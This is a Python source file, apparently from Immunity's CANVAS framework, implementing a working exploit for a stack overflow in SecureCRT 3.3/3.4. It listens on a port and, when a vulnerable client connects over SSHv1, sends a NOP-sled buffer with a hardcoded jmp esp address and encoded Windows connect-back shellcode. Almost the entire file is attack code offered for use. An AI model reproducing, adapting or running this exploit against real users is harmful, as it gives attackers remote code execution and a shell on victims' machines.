#! /usr/bin/env python

"""
Proprietary CANVAS source code - use only under the license agreement
specified in LICENSE.txt in your CANVAS distribution
Copyright Immunity, Inc, 2002-2006
http://www.immunityinc.com/CANVAS/ for more information

CANVAS securecrt.py, exploits the stack overflow in securecrt

TO Demo this - load Secure CRT v 3.3 or 3.4, then connect to this exploit
as SSHv1. Then click OK. done.
There appears to be some sort of issue where the client actually only
does one read() and so too much TCP latency appears to actually cause
this exploit to mal-function.

Potentially this could be worked around by reworking the exploit to send more
data.
"""


VERSION="1.0"

import os,getopt
import socket
from exploitutils import *
from encoder import chunkedaddencoder
from shellcode import win32shell
import time

from canvasexploit import canvasexploit
import canvasengine

BADSTRING=",:;\x00\x0a\x0d+\x2f\x5c\x09\x0e\x0b"

header=""
header+="\x41\x42\x43\x44\x45\x20\x20\x90\x90\x90\x90\x90\x90"
header+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
header+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
header+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
header+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
header+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
header+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

class securecrtexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.setVersion(1)
        self.seconds=30
        return
    
    def setVersion(self,versionnum):
        if versionnum==1:
            #jmp eax
            #self.geteip=0x12c2a8
            #jmp esp
            self.geteip=0x74fd2d57
        else:
            self.log("I don't support version %d"%versionnum)

    def setSeconds(self,seconds):
        self.seconds=seconds
        return
    
    def neededListenerTypes(self):
        return [canvasengine.WIN32LISTENER]


    def setPort(self,port):
        self.port=port
        return
   
    def setShellcode(self,shellcode):
        self.shellcode=shellcode
        return


    
    def createShellcode(self,localhost,localport):
        """
        Creates the shellcode that we use
        """
        rawshellcode=win32shell.getshellcode(localhost,localport)
        self.log("length rawshellcode = "+str(len(rawshellcode)))
        #set up the shellcode
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(BADSTRING)

        self.log("Encoding shellcode with Chunked Additive Encoder. This may take a while. If it takes too long, set minimum chunk size smaller")
        shellcode=encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode of length %d into length %d."%(len(rawshellcode),len(shellcode)))
        if shellcode=="":
            self.log( "Could not encode shellcode")
            return 0

        #print prettyprint(shellcode[:])
        #sys.exit(0)

        #add a debug int to the front
        #shellcode="\xcc"+shellcode

        self.setShellcode(shellcode)
        return 1

    def makeattack(self):
        ret=""
        align=0
        ret+=header
        ret+="A"*177+"B"*align
        ret+=intel_order(self.geteip)
        ret+="A"*400
        ret+=self.shellcode
        return ret
    

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listenhost=""
        listenport=self.port
        timeout=self.seconds
        try:
            s.bind((listenhost, listenport))
            s.listen(5)
        except:
            self.log("Could not listen on that socket")
            return 0
        self.log("Now listening for %d seconds on port %d. Connect with SSHv1"%(timeout,self.port))
        print "Now listening for %d seconds on port %d. Connect with SSHv1"%(timeout,self.port)
        s.set_timeout(timeout)
        try:
            newsocket,addr=s.accept()
        except:
            print "Exiting exploit"
            self.log("Exception occured during accept - likely we timed out.")
            close(s)
            return
        print "Accepted...sending attack"
        self.log("Connected to by %s"%str(addr))
        attackstring=self.makeattack()
        newsocket.send(attackstring)
        return
    
